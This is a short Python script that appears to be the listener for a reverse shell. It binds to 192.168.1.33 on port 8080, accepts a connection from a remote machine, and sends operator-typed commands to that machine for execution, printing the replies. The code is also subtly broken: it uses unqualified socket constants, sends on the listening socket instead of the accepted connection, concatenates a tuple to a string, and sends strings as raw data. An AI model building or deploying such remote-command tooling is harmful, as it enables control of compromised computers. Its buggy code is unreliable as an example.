#!/usr/bin/python

import socket


def connect():
	Tcpsocket = socket.socket(AF_INET,SOCK_STREAM)
	Tcpsocket.bind(("192.168.1.33",8080))
	Tcpsocket.listen(1)
	conn,addr = Tcpsocket.accept()
	print("We have a connection from" + addr)
	while True:
		command = input("$")
		if "terminate" in command:
			Tcpsocket.sendall("terminate")
			Tcpsocket.close()
			break
		else:
			Tcpsocket.sendall(command)
			print(Tcpsocket.recv(1024))
def main():
	connect()
main()
			
	
